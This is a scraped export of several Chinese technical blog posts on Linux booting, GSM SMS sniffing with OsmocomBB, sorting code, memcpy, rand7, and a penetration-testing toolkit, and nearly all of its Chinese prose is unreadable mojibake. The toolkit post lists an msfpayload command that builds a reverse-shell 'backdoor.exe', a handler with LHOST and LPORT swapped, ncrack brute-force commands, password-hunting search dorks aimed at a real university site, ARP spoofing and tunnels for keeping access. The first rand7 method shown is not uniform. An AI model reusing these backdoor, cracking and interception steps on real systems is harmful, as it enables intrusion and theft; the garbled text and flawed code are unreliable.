stageå¤åˆ¶ç¬¬ä¸€ä¸ªæ‰‡åŒºåˆ°æŒ‡å®šå†…å­˜åœ°å€ï¼Œç„¶åä»é‚£å¼€å§‹æ‰§è¡Œï¼Œæƒ¯ä¾‹åšæ³•æ˜¯åœ¨ç¬¬ä¸€ä¸ªæ‰‡åŒºæ”¾ä¸Šä¸€ä¸ªåŠ è½½æ“ä½œç³»ç»Ÿçš„ç¨‹åºç­‰å¾…è¢«å¤åˆ¶æ‰§è¡Œã€‚æ—©æœŸçš„ linux 2.4 ä¹‹å‰ç¬¬ä¸€ä¸ªæ‰‡åŒºå¾€å¾€å°±æ˜¯æ”¾ç€ä¸€ä¸ª bootloader, ä»¥æ­¤åœ¨ç¬¬ä¸€ä¸ªæ‰‡åŒºæ‹·è´ä¸€ä¸ªå†…æ ¸é•œåƒå°±å¯ä»¥ä½¿è½¯ç›˜å¯å¯åŠ¨ã€‚grub å°±æ˜¯è¿™æ ·ä¸€ä¸ªåŠ è½½æ“ä½œç³»ç»Ÿçš„ç¨‹åºã€‚ä¸‹é¢è¿™ä¸ªæŒ‡ä»¤å°±æ˜¯ grub äº¤äº’æ¨¡å¼ä¸­æ„é€ ç¬¬ä¸€ä¸ªæ‰‡åŒºçš„æŒ‡ä»¤çš„å‘½ä»¤ï¼Œè®² stage1 å†™å…¥åˆ†åŒºå¤´éƒ¨ã€‚ setup (fd0) ä¸åŒäºç°åœ¨ï¼Œå› ä¸ºç°åœ¨çš„å†…æ ¸è§„æ¨¡å˜å¤§ç¬¬ä¸€ä¸ªæ‰‡åŒºæ”¾ä¸ä¸‹ï¼Œæ‰€æœ‰äº¤ç”±ä¸“é—¨çš„ bootloader è´Ÿè½½åŠ è½½å†…æ ¸ã€‚ ç¡¬ç›˜çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºæ˜¯ä¸»å¼•å¯¼è®°å½• (MBR), è¿™ä¸ªæ‰‡åŒºåŒ…å«ä¸€ä¸ªå°ç¨‹åº (446bytes) å’Œä¸€ä¸ªåˆ†åŒºè¡¨ (64bytes), è¿™ä¸ªå°ç¨‹åºç”¨æ¥è£…è½½è¢«å¯åŠ¨çš„æ“ä½œç³»ç»Ÿæ‰€åœ¨åˆ†åŒºçš„ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œä¸‹é¢ mbr å†…å­˜å¸ƒå±€å¯ä»¥çœ‹è§ 0xaa55(å°ç«¯å­—èŠ‚åº). 1234567#dd if=floopy.img of=temp bs=1 count=512#hexdump -x temp00001b0 0000 0000 0000 0000 0000 0000 0000 122400001c0 090f be00 7dbd c031 13cd 8a46 800c 00f900001d0 0f75 dabe e87d ffcf 9deb 6c46 706f 797000001e0 bb00 7000 01b8 b502 b600 cd00 7213 b6d700001f0 b501 e94f fee6 0000 0000 0000 0000 aa55 ä¸åŒäº lilo,grub å¯ä»¥ä»æ–‡ä»¶ç³»ç»Ÿ ext2 å’Œ ext3 ä¸­åŠ è½½ Linux, å®ƒæ˜¯é€šè¿‡ä¸¤ä¸ªé˜¶æ®µçš„å¼•å¯¼åŠ è½½ç¨‹åºè½¬æ¢æˆä¸‰ä¸ªé˜¶æ®µçš„å¼•å¯¼åŠ è½½ç¨‹åºæ¥å®ç°çš„ã€‚é˜¶æ®µ 1(MBR) å¼•å¯¼ä¸€ä¸ªé˜¶æ®µ 1.5 çš„å¼•å¯¼åŠ è½½å™¨ï¼Œå¯ä»¥ç†è§£åŒ…å« linux å†…æ ¸æ˜ åƒçš„ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿï¼Œå½“ stage1_5 è¢«åŠ è½½è¿‡åï¼Œstage2 å°±å¯ä»¥è¢«æ¥ç€åŠ è½½äº†ã€‚ å½“é˜¶æ®µ 2 åŠ è½½ä¹‹åï¼ŒGRUB å°±å¯ä»¥åœ¨è¯·æ±‚æ—¶æ˜¾ç¤ºå¯ç”¨å†…æ ¸åˆ—è¡¨ (åœ¨ &#x2F;etc&#x2F;grub.conf ä¸­å®šä¹‰ï¼Œè¿˜æœ‰å‡ ä¸ªç¬¦å·é“¾æ¥), æˆ‘ä»¬å¯ä»¥åœ¨é‚£å®šåˆ¶ grub æ¥æ§åˆ¶å¯åŠ¨ã€‚stage2 è¢«åŠ è½½åˆ°å†…å­˜åï¼Œå°±å¯ä»¥å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡ŒæŸ¥è¯¢äº†ï¼Œå¹¶å°†é»˜è®¤çš„ initrd åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œstage2 çš„å¼•å¯¼åŠ è½½ç¨‹åºå°±å¯ä»¥è°ƒç”¨å†…æ ¸æ˜ åƒäº†ã€‚ 0x06 os booting[^linuxboot]å½“å†…æ ¸æ˜ åƒè¢«åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶ä¸”é˜¶æ®µ 2 çš„å¼•å¯¼åŠ è½½ç¨‹åºé‡Šæ”¾æ§åˆ¶æƒä¹‹åï¼Œå†…æ ¸é˜¶æ®µå°±å¼€å§‹ã€‚å†…æ ¸æ˜ åƒå¹¶ä¸æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œçš„å†…æ ¸ï¼Œè€Œæ˜¯ä¸€ä¸ªå‹ç¼©è¿‡çš„å†…æ ¸æ˜ åƒã€‚é€šå¸¸å®ƒæ˜¯ä¸€ä¸ª zImage(å‹ç¼©æ˜ åƒï¼Œå°äº 512KB æˆ–ä¸€ä¸ª bzImage(è¾ƒå¤§çš„å‹ç¼©æ˜ åƒï¼Œå¤§äº 512KB), å®ƒæ˜¯æå‰ä½¿ç”¨ zlib è¿›è¡Œå‹ç¼©è¿‡çš„ã€‚åœ¨è¿™ä¸ªå†…æ ¸æ˜ åƒå‰é¢æ˜¯ä¸€ä¸ªä¾‹ç¨‹ï¼Œå®ƒå®ç°å°‘é‡ç¡¬ä»¶è®¾ç½®ï¼Œå¹¶å¯¹å†…æ ¸æ˜ åƒä¸­åŒ…å«çš„å†…æ ¸è¿›è¡Œè§£å‹ï¼Œç„¶åå°†å…¶æ”¾å…¥é«˜ç«¯å†…å­˜ä¸­ï¼Œå¦‚æœæœ‰åˆå§‹ RAM ç£ç›˜æ˜ åƒï¼Œå°±ä¼šå°†å®ƒç§»åŠ¨åˆ°å†…å­˜ä¸­ï¼Œå¹¶æ ‡æ˜ä»¥åä½¿ç”¨ã€‚ç„¶åè¯¥ä¾‹ç¨‹ä¼šè°ƒç”¨å†…æ ¸ï¼Œå¹¶å¼€å§‹å¯åŠ¨å†…æ ¸å¼•å¯¼çš„è¿‡ç¨‹ã€‚ å½“ bzImage(ç”¨äº i386 æ˜ åƒ) è¢«è°ƒç”¨æ—¶ï¼Œæˆ‘ä»¬ä».&#x2F;arch&#x2F;i386&#x2F;boot&#x2F;head.S çš„ start æ±‡ç¼–ä¾‹ç¨‹å¼€å§‹æ‰§è¡Œã€‚è¿™ä¸ªä¾‹ç¨‹ä¼šæ‰§è¡Œä¸€äº›åŸºæœ¬çš„ç¡¬ä»¶è®¾ç½®ï¼Œå¹¶è°ƒç”¨./arch/i386/boot/compressed/head.Sä¸­çš„ startup_32 ä¾‹ç¨‹ã€‚æ­¤ä¾‹ç¨‹ä¼šè®¾ç½®ä¸€ä¸ªåŸºæœ¬çš„ç¯å¢ƒ (å †æ ˆç­‰), å¹¶æ¸…é™¤ Block Started by Symbol(BSS). ç„¶åè°ƒç”¨ä¸€ä¸ªå«åš decompress_kernel çš„ C å‡½æ•° (åœ¨.&#x2F;arch&#x2F;i386&#x2F;boot&#x2F;compressed&#x2F;misc.c ä¸­) æ¥è§£å‹å†…æ ¸ã€‚å½“å†…æ ¸è¢«è§£å‹åˆ°å†…å­˜ä¸­ä¹‹åï¼Œå°±å¯ä»¥è°ƒç”¨å®ƒäº†ã€‚è¿™æ˜¯å¦å¤–ä¸€ä¸ª startup_32 å‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°åœ¨.&#x2F;arch&#x2F;i386&#x2F;kernel&#x2F;head.S ä¸­ã€‚ åœ¨è¿™ä¸ªæ–°çš„ startup_32 å‡½æ•° (ä¹Ÿç§°ä¸ºæ¸…é™¤ç¨‹åºæˆ–è¿›ç¨‹ 0) ä¸­ï¼Œä¼šå¯¹é¡µè¡¨è¿›è¡Œåˆå§‹åŒ–ï¼Œå¹¶å¯ç”¨å†…å­˜åˆ†é¡µåŠŸèƒ½ã€‚ç„¶åä¼šä¸ºä»»ä½•å¯é€‰çš„æµ®ç‚¹å•å…ƒ (FPU) æ£€æµ‹ CPU çš„ç±»å‹ï¼Œå¹¶å°†å…¶å­˜å‚¨èµ·æ¥ä¾›ä»¥åä½¿ç”¨ã€‚ç„¶åè°ƒç”¨ start_kernel å‡½æ•° (åœ¨ init&#x2F;main.c ä¸­), å®ƒä¼šå°†æ‚¨å¸¦å…¥ä¸ä½“ç³»ç»“æ„æ— å…³çš„ Linux å†…æ ¸éƒ¨åˆ†ã€‚å®é™…ä¸Šï¼Œè¿™å°±æ˜¯ Linux å†…æ ¸çš„ main å‡½æ•°ã€‚ é€šè¿‡è°ƒç”¨ start_kernel, ä¼šè°ƒç”¨ä¸€ç³»åˆ—åˆå§‹åŒ–å‡½æ•°æ¥è®¾ç½®ä¸­æ–­ï¼Œæ‰§è¡Œè¿›ä¸€æ­¥çš„å†…å­˜é…ç½®ï¼Œå¹¶åŠ è½½åˆå§‹ RAM ç£ç›˜ã€‚æœ€åï¼Œè¦è°ƒç”¨ kernel_thread(åœ¨ arch&#x2F;i386&#x2F;kernel&#x2F;process.c ä¸­) æ¥å¯åŠ¨ init å‡½æ•°ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªç”¨æˆ·ç©ºé—´è¿›ç¨‹ (user-space process). æœ€åï¼Œå¯åŠ¨ç©ºä»»åŠ¡ï¼Œç°åœ¨è°ƒåº¦å™¨å°±å¯ä»¥æ¥ç®¡æ§åˆ¶æƒäº† (åœ¨è°ƒç”¨ cpu_idle ä¹‹å). é€šè¿‡å¯ç”¨ä¸­æ–­ï¼ŒæŠ¢å å¼çš„è°ƒåº¦å™¨å°±å¯ä»¥å‘¨æœŸæ€§åœ°æ¥ç®¡æ§åˆ¶æƒï¼Œä»è€Œæä¾›å¤šä»»åŠ¡å¤„ç†èƒ½åŠ›ã€‚ åœ¨å†…æ ¸å¼•å¯¼è¿‡ç¨‹ä¸­ï¼Œåˆå§‹ RAM ç£ç›˜ (initrd) æ˜¯ç”±é˜¶æ®µ 2 å¼•å¯¼åŠ è½½ç¨‹åºåŠ è½½åˆ°å†…å­˜ä¸­çš„ï¼Œå®ƒä¼šè¢«å¤åˆ¶åˆ° RAM ä¸­å¹¶æŒ‚è½½åˆ°ç³»ç»Ÿä¸Šã€‚è¿™ä¸ª initrd ä¼šä½œä¸º RAM ä¸­çš„ä¸´æ—¶æ ¹æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨ï¼Œå¹¶å…è®¸å†…æ ¸åœ¨æ²¡æœ‰æŒ‚è½½ä»»ä½•ç‰©ç†ç£ç›˜çš„æƒ…å†µä¸‹å®Œæ•´åœ°å®ç°å¼•å¯¼ã€‚ç”±äºä¸å¤–å›´è®¾å¤‡è¿›è¡Œäº¤äº’æ‰€éœ€è¦çš„æ¨¡å—å¯èƒ½æ˜¯ initrd çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤å†…æ ¸å¯ä»¥éå¸¸å°ï¼Œä½†æ˜¯ä»ç„¶éœ€è¦æ”¯æŒå¤§é‡å¯èƒ½çš„ç¡¬ä»¶é…ç½®ã€‚åœ¨å†…æ ¸å¼•å¯¼ä¹‹åï¼Œå°±å¯ä»¥æ­£å¼è£…å¤‡æ ¹æ–‡ä»¶ç³»ç»Ÿäº† (é€šè¿‡ pivot_root)ï¼šæ­¤æ—¶ä¼šå°† initrd æ ¹æ–‡ä»¶ç³»ç»Ÿå¸è½½æ‰ï¼Œå¹¶æŒ‚è½½çœŸæ­£çš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚ initrd å‡½æ•°è®©æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå°å‹çš„ Linux å†…æ ¸ï¼ŒåŒ…æ‹¬ä½œä¸ºå¯åŠ è½½æ¨¡å—ç¼–è¯‘çš„é©±åŠ¨ç¨‹åºã€‚è¿™äº›æ¨¡å—ä¸ºå†…æ ¸æä¾›äº†è®¿é—®ç£ç›˜å’Œç£ç›˜ä¸Šçš„æ–‡ä»¶ç³»ç»Ÿçš„æ–¹æ³•ï¼Œå¹¶ä¸ºå…¶ä»–ç¡¬ä»¶æä¾›äº†é©±åŠ¨ç¨‹åºã€‚ç”±äºæ ¹æ–‡ä»¶ç³»ç»Ÿæ˜¯ç£ç›˜ä¸Šçš„ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå› æ­¤ initrd å‡½æ•°ä¼šæä¾›ä¸€ç§å¯åŠ¨æ–¹æ³•æ¥è·å¾—å¯¹ç£ç›˜çš„è®¿é—®ï¼Œå¹¶æŒ‚è½½çœŸæ­£çš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚ 0x07 user interfaceå½“å†…æ ¸è¢«å¼•å¯¼å¹¶è¿›è¡Œåˆå§‹åŒ–ä¹‹åï¼Œå†…æ ¸å°±å¯ä»¥å¯åŠ¨è‡ªå·±çš„ç¬¬ä¸€ä¸ªç”¨æˆ·ç©ºé—´åº”ç”¨ç¨‹åºäº†ã€‚è¿™æ˜¯ç¬¬ä¸€ä¸ªè°ƒç”¨çš„ä½¿ç”¨æ ‡å‡† C åº“ç¼–è¯‘çš„ç¨‹åºã€‚åœ¨æ¡Œé¢ Linux ç³»ç»Ÿä¸Šï¼Œç¬¬ä¸€ä¸ªå¯åŠ¨çš„ç¨‹åºé€šå¸¸æ˜¯ &#x2F;sbin&#x2F;init, ä¸è¿‡è¿™æ˜¯å¯é€‰æ‹©çš„ (&#x2F;etc&#x2F;inittab). reference:[^ubwiki]: ubuntu wiki[^ulk]: æ·±å…¥ç†è§£ Linux æ“ä½œç³»ç»Ÿ[^linuxboot]: Linux å¼•å¯¼è¿‡ç¨‹å†…å¹•[^download]: download","tags":["linux"]},{"title":"gsm sniffer","path":"/2015/09/14/gsm-sinffer/","content":"0x00 provisionä¸€ä¸ª Linux ç³»ç»Ÿï¼Œæ‘©æ‰˜ç½—æ‹‰ c118,T å‹ minusb æ•°æ®çº¿ï¼ŒMotorola c118&#x2F;c123 æ•°æ®è¿æ¥çº¿ï¼ŒFT232 USB è½¬ä¸²å£ TTL,Motorola C118&#x2F;c123 æ»¤æ³¢å™¨å¥—ä»¶ (è¿™ä¸ªéœ€è¦ç„Šæ¥æŠ€èƒ½ï¼Œæ¢æ»¤æ³¢å™¨å¯ä»¥æ•è· uplink ä¿¡å·), æ„Ÿè°¢æ›¾å“¥èµåŠ©è¿™äº›ç©å…·ï¼Œå¯ä»¥åˆ°æ·˜å®åº—ä¸€æ¬¡ä¹°å…¨ã€‚ 0x01 software12345mkdir gprs_sniffercd gprs_sniffergit clone git://git.osmocom.org/osmocom-bb.gitgit clone git://git.osmocom.org/libosmocore.gitgit clone git://git.srlabs.de/gprsdecode.git ä¸‹è½½äº¤å‰ç¼–è¯‘ç¯å¢ƒ here, æŸäº› 64 ä½çš„ linux éœ€è¦å®‰è£… 32 çš„ glibc çš„åº“ã€‚å®éªŒç¯å¢ƒå‡†å¤‡å¥½ï¼Œç›®å½•æ˜¯è¿™ä¸ªæ ·å­ dir 0x02 debug environment12tar xf bu-2.15_gcc-3.4.3-c-c++-java_nl-1.12.0_gi-6.1.tar.bz2export PATH=$PATH:/root/gprs_sniffer/gnuarm-3.4.3/bin è§£å‹äº¤å‰ç¼–è¯‘ç¯å¢ƒå‡†å¤‡è®¾ç½®å˜é‡ã€‚ 12345cd libosmocoreautoreconf -i./configuremakesudo make install autoreconf å·¥å…·ç”± automake çš„åŒ…æä¾›çš„ã€‚ 12cd gprsdecodemake è¿™ä¸ªæ¨¡å—å¹¶æ²¡æœ‰æ³¨æ„åˆ°ä»€ä¹ˆåœ°æ–¹ç”¨ï¼Œæ˜¯æŒ‰ç…§å‚è€ƒæ–‡æ¡£ä¸Šçš„æ•²çš„ ^52. 12345cd osmocom-bbgit checkout --track origin/luca/gsmmapvim /root/gprs_sniffer/osmocom-bb/src/target/firmware/Makefile # æŠŠ CFLAGS += -DCONFIG_TX_ENABLE å‰çš„æ³¨é‡Šç¬¦å·å»æ‰cd srcmake -j8 å¤„ç† OsmocomBB åˆ†æ”¯é—®é¢˜ï¼Œäº²æµ‹ luca&#x2F;gsmmap å¯ç¼–è¯‘é€šè¿‡ï¼Œè€Œä¸”éœ€è¦æŠŠ mocom-bb&#x2F;src&#x2F;target&#x2F;firmwire&#x2F; ä¸‹çš„ Makefile ä¸­çš„ CONFIG_TX_ENABLE å®æ³¨é‡Šå–æ¶ˆæ‰ï¼Œä¸ç„¶ä¸€ç›´åœ¨æ‰«ææ²¡æœ‰ç»“æœã€‚ 0x03 sniffing12cd host/osmocon/sudo ./osmocon -p /dev/ttyUSB0 -m c123xor ../../target/firmware/board/compal_e88/layer1.compalram.bin å…ˆæŠŠ c118 å…³æœºï¼Œç„¶åç¡®è®¤å’Œç”µè„‘çš„è¿æ¥æ­£å¸¸ï¼Œè¾“å…¥ä¸Šé¢çš„å‘½ä»¤ï¼ŒæŒ‰ä¸€ä¸‹ c118 çš„çº¢è‰²ç”µæºé”®ï¼Œåˆ·å…¥ layer1 çš„å›ºä»¶ï¼Œä¼šçœ‹åˆ° c118 çš„æ‰‹æœºå±å¹•æ˜¾ç¤ºã€‚ 12cd osmocom-bb/src/host/layer23/src/miscsudo ./cell_log -O æ‰«æåŸºç«™ä¿¡æ¯ï¼ŒPWR æ•°å€¼è¶Šå¤§ä¿¡å·è¶Šå¥½ï¼Œæ³¨æ„æ˜¯è´Ÿæ•°ã€‚ 1sudo ./ccch_scan -i 127.0.0.1 -a 56 ç„¶åä½¿ç”¨ ccch_scan è¿›è¡ŒæŠ“åŒ…ï¼Œ-a å‚æ•°ä¸ºæŒ‡å®š ARFCN å· 1sudo wireshark -k -i lo -f &#x27;port 4729&#x27; æ³¨æ„ wireshark çš„ filiter çš„å†™æˆ GSM_SMS. 0x04 demosms","tags":["security"]},{"title":"sort algorithms","path":"/2015/03/11/sort/","content":"å­¦ä¹ ä¸€ä¸‹å‡ ä¸ªåŸºæœ¬çš„æ’åºç®—æ³•ï¼Œè®°å½•ä¾›æ—¥åå‚è€ƒã€‚ æ’å…¥æ’åºï¼š 12345678void insert_sort(int nums[], int len)&#123; for (int i = 1, j = 0; i &lt; len; ++i) &#123; int temp = nums[i]; for (j = i - 1; j &gt;= 0 &amp;&amp; nums[j] &gt; temp; --j) nums[j+1] = nums[j]; nums[j+1] = temp; &#125;&#125; å†’æ³¡æ’åº 12345678void bsort(int nums[], int len)&#123; for (int i = 0; i &lt; len-1; i++) &#123; for (int j = 0; j &lt; len - i - 1; j++) &#123; if (nums[j] &gt; nums[j+1]) swap(nums[j], nums[j+1]); &#125; &#125;&#125; å¿«é€Ÿæ’åº 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;using namespace std;int partition(int nums[], int low, int high)&#123; int p = nums[high]; int i = low - 1; for (int j = low; j &lt;= high - 1; j++) &#123; if (nums[j] &lt; p) &#123; i++; swap(nums[i], nums[j]); &#125; &#125; swap(nums[i+1], nums[high]); return i + 1;&#125;void qsort(int nums[], int low, int high)&#123; if (low &lt; high) &#123; int i = partition(nums, low, high); qsort(nums, low, i-1); qsort(nums, i+1, high); &#125;&#125;void debug(int nums[], int last) &#123; for (int i = 0; i &lt;= last; i++) &#123; printf(&quot;%d &quot;, nums[i]); &#125; printf(&quot; &quot;);&#125;int main() &#123; int a[] = &#123;1, 3, 2, 3, 4, 1, 2, 6, 5, 9, 6&#125;; int size = sizeof(a)/sizeof(int); qsort(a, 0, size-1); debug(a, size-1);&#125;","tags":["algorithms"]},{"title":"to implement mymemcpy","path":"/2015/01/23/mymemcpy/","content":"è€ƒè™‘ä¸€ä¸‹æ¥å£è®¾è®¡ï¼Œå†…å­˜è¦†ç›–ï¼Œå®ç°ç»†èŠ‚ã€‚ 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;void mymemcpy(void * dest, const void * src, size_t len)&#123;\tassert((dest != NULL) &amp;&amp; (src != NULL));\tchar * pdest = (char *) dest;\tconst char * psrc = (const char *) src;\tif (pdest &gt; psrc &amp;&amp; pdest &lt; psrc + len) &#123; for (size_t i = len - 1; i != -1; --i) pdest[i] = psrc[i];\t&#125;\telse &#123; while(len--) *pdest++ = *psrc++;\t&#125;&#125;int main()&#123;\tconst char a[] = &quot;hello world&quot;;\tvoid *dest = malloc(23);\tmymemcpy(dest, a, 5);\tprintf(&quot;dest is %s &quot;, dest);\tmymemcpy(dest+1, dest, 5);\tprintf(&quot;dest is %s &quot;, dest);\tfree(dest);\treturn 0;&#125;","tags":["algorithms"]},{"title":"to implement rand7() by rand5()","path":"/2015/01/21/rand-7/","content":"ä¸»è¦æ€è·¯æ˜¯æ„é€ ä¸€ä¸ªè§£ç©ºé—´æ˜ å°„$$A$$åˆ°å¦ä¸€ä¸ªè§£ç©ºé—´$$B$$ï¼Œå°±è¿™ä¸ªé¢˜ç›®è€Œè¨€éœ€è¦æ³¨æ„çš„æ˜¯ä»$$A$$ä¸­å€¼æ˜ å°„åˆ°$$B$$ä¸­å€¼çš„æ•°é‡åº”è¯¥æ˜¯ç›¸ç­‰çš„ã€‚ æŒ‰ç…§ä¸Šé¢æ€è·¯ï¼š æ„é€ ä¸€ä¸ª$$5\\times 5 $$çš„çŸ©é˜µå¾ªç¯å¡«å…… 3 é 1-7ï¼Œå…±è®¡ 21 ä¸ªå–å€¼ç©ºé—´å…¶ä½™ä»¥ 0 è¡¥é½ï¼Œå¦‚æœè¿”å›å€¼ä¸º 0ï¼Œåœ¨æ¥ä¸€æ¬¡ã€‚ 123456int val = 0;result[5 * 5] = [1, 2, 3, 4, 5, 6, 7, 1, 2, 3, 4, 5, 6, 7, 1, 2, 3, 4, 5, 6, 7, 0, 0, 0, 0];while (val == 0) &#123;val = result[rand5() * rand5()];&#125;rerurn val; æ”¹è‰¯ä¸€ä¸‹ï¼Œå…¶å®è¿™æ˜¯éœ€è¦ 21 ä¸ªè§£ï¼Œå³ä¸º 7 çš„å€æ•°ï¼Œå¦‚ä½•é  rand5() çš„è¿ç®—æ„é€ å‡ºå°±å¯ä»¥äº†ã€‚è€ƒè™‘ä¸€ä¸‹ rand5() æœ€å¤§æ˜¯ 5ï¼Œæœ€å°æ˜¯ 1ï¼Œåˆ™$$rand5() \\times rand5() &#x3D; [1, 25]$$, ç„¶åå–$$[1, 21]$$é‡æ–°æ˜ å°„åˆ°$$[1, 7]$$ã€‚ demoï¼š 123456789101112131415161718192021222324252627import randomdef rand5(): return random.randint(1, 5)# careful: 7 % 7 = 0, 14 % 7 = 0# so need i % 7 + 1def rand7(): while (True): i = 5 * (rand5() - 1) + rand5() if 21 &gt;= i: break return i % 7 + 1if __name__ == &quot;__main__&quot;: try: state = &#123;1: 0, 2: 0, 3: 0, 4: 0, 5: 0, 6: 0, 7: 0&#125; while (True): state[rand7()] += 1 except KeyboardInterrupt: print state exit","tags":["algorithms"]},{"title":"network security toolkit","path":"/2015/01/01/network-security-tools/","content":"0x00 Objectiveé¡ºä¾¿å€ŸåŠ©ä¸»æµå·¥å…·ï¼Œæ¥ä»‹ç»å¸¸è§„ç½‘ç»œé—®é¢˜ã€‚ 0x01 distributions: kali:From the creators of BackTrack comes Kali Linux, the most advanced and versatile penetration testing distribution ever created. We have a whole set of amazing features lined up in our security distribution, geared at streamlining the penetration testing experience. Backbox Linux:Another Ubuntu based distro but uses XFCE as its window manager and relies on its own repo to constantly keep its tools updated. Pentoo:A livecd based on Gentoo and XFCE. Also available as an overlay for existing Gentoo installations. Has the ability to crack passwords using GPGPU out of the box. 0x02 recceä¼ ç»Ÿçš„æœ¬åœ° dns æ¢æµ‹å·¥å…·ï¼Œå¤šæ•°ä¾èµ–äºå­—å…¸æ–‡ä»¶ï¼š 12dnsenum.pl -f dns_list.txt --dnserver 8.8.8.8 cisco.com -o cisco.listdnsmap cisco.com -w wordlist.txt -c cisco.csv è·¯ç”±ä¿¡æ¯æ”¶é›†å·¥å…·ï¼Œä¸€ä¸ªä¼ ç»Ÿçš„ udp å®ç°ï¼Œä¸€ä¸ªç°ä»£ä¸€ç‚¹çš„åˆ©ç”¨ tcp å®ç°ï¼Œå¯ä»¥ç©¿è¶Šé˜²ç«å¢™ã€‚ paratrace, ä¸€ç§æ–°çš„ã€éšå½¢çš„ traceroute, å¯ä½¿ç”¨æœ‰çŠ¶æ€çš„è¿‡æ»¤å™¨ã€‚ traceroute: ä¼ ç»Ÿçš„å·¥å…· tcptracerouteï¼šç¨å¾®æ–°ä¸€ç‚¹ï¼Œåˆ©ç”¨ tcp çš„å·¥å…·ã€‚ æœç´¢å¼•æ“çš„æŠ€å·§ http://en.wikipedia.org/wiki/Google_hacking filetype:xls site:jlxy.nju.edu.cn å¯†ç  site:jlxy.nju.edu.cn å¯†ç  site:jlxy.nju.edu.cn filetype:doc site:jlxy.nju.edu.cn intext:admin è‡ªåŠ¨åŒ–ï¼Œç»¼åˆçš„ä¿¡æ¯æ”¶é›†å¹³å° maltego 1ï¼šdomain 2ï¼šdns 3ï¼šwhois information 4ï¼šnetwork block 5ï¼šip address 6ï¼šE-mail 0x03 scanningå‘ç°ä¸»æœº 12345678910arping -c 2 192.168.1.1fping -s -r 1 192.168.1.1 192.168.1.254hping3 -c 2 192.168.1.1hping3hping&gt;hping send &#123;ip(addr=192.168.1.1)+icmp(type=8,code=0)&#125;nbtscan 192.168.1.1-254 æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ« ä¸»åŠ¨ï¼šnmap -O è¢«åŠ¨ï¼šp0f ç«¯å£æ‰«æ autoscan netifera scanrand: ä¸€ä¸ªéå¸¸å¿«é€Ÿã€æ— çŠ¶æ€çš„ TCP ç«¯å£æ‰«æå™¨å’Œ traceroute å·¥å…· æœåŠ¡æ¢æµ‹ 12cd /pentest/enumeration/www/httprint/linux/httprint -h 192.168.1.1 -s singnature.txt VPN æ¢æµ‹ 12ike-scan -M -v 192.168.1.1sslscan 192.168.1.1 0x04 Vulnerability discoveryCisco toolscisco auditing tool 1# ./CAT -h 192.182.1.1 -w lists/community -a lists/passwords -I Cisco passwd scanner 1# ./cisco 10.10.10 3 -t 4 -C 10 Snmp tools 12cd /pentest/enumeration/snmp/admsnmp./ADMsnmp 192.168.1.1 -wordf wordlist.list å¦‚æœä½ çŸ¥é“ snmp çš„ community, ä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªå·¥å…·æ”¶é›†ä¿¡æ¯ã€‚ 12cd /pentest/enumeration/snmp/snmpenum/./snmpenum 192.168.1.1 private windows.txt 0x05 web toolkitBurp suite Nikto 1# ./nikto.pl -h 192.168.1.1 -C -p 80 T3487b -t 3 -D \\V -o webtest -F htm W3af è¿™ä¸ª waf çš„æ¢æµ‹å·¥å…·ï¼šWAFW00F 12cd /pentest/web/waffit/./wafw00f http://.... ä»‹ç»ä¸¤ä¸ªæˆç†Ÿçš„æ¡†æ¶ï¼šopenvasï¼Œnessus 0x06 Integrated toolsMSF 1# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.150 LPORT=4444 X &gt; backdoor.exe 12345msfconsoleuse exploit/multi/handerset PAYLOAD windows/meterpreter/reverse_tcpset LPORT 192.168.1.150set LHOST 4444 0x07 local networkLayer 2: CDP(cisco discovery protocols) mac flood Layer 3:dhcp tcp syn flood ç»“åˆä¸€ç‚¹ç‚¹å—…æ¢æŠ€æœ¯ï¼šåŒ…ç”± Dug Song ç¼–å†™ï¼Œå·²ç»å‘å¸ƒå‡ å¹´äº†ï¼Œæ˜¯ä¸€ç»„å¼ºå¤§çš„ç½‘ç»œå®¡æ ¸å·¥å…·ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªç®€æ´çš„å°å·¥å…· arpspoof, å¯ç”¨äºå‘ ARP ç¼“å­˜æ³¨å…¥è™šå‡ä¿¡æ¯ã€‚è¯¥å·¥å…·å¯ä»¥åˆ›å»º Gratuitous ARP åº”ç­”ï¼Œåº”ç­”æ•°æ®åŒ…ä¸­çš„æº IP æ˜¯ç”¨æˆ·æ‰“ç®—ä¼ªè£…çš„ IP åœ°å€ï¼Œè€Œç›®æ ‡ IP åˆ™æ˜¯æ‰€è¦å—…æ¢çš„ç›®æ ‡è®¡ç®—æœºã€‚ 0x08 crack the passwordonlineï¼šä»¥ç ´è§£ cisco çš„è·¯ç”±å™¨ï¼Œå’Œ html è¡¨å•çš„ä¾‹å­ã€‚12ncrack -U pass -v -P pass telnet://192.168.1.1ncrack -U pass -v -P pass http://192.168.1.1 offlineï¼šæ— çº¿çš„å¯†ç ç ´è§£æ˜¯ç¦»çº¿çš„0x09 Maintaining AccessåŸºæœ¬éƒ½æ˜¯ä¸¤å°ä¸»æœºï¼Œå…¶ä¸­ä¸€å°æ›¿å¦ä¸€å°é€šè¿‡æŸäº›æœåŠ¡å¯¹æµé‡è¿›è¡Œå°è£…ä¸­ç»§ã€‚ DNS éš§é“Server:dns2tcpd 1./dns2tcpd -F -d 1 -f dns2tcpd.conf Client: 1./dns2tcpc -z domain.org 1234Domain=domain.orgRescoure = sshLocal_port = 2222Debug = 1 icmp éš§é“Server: 1./ptunnel Client: 1./ptunnel -p tun.ser_ip -lp 2222 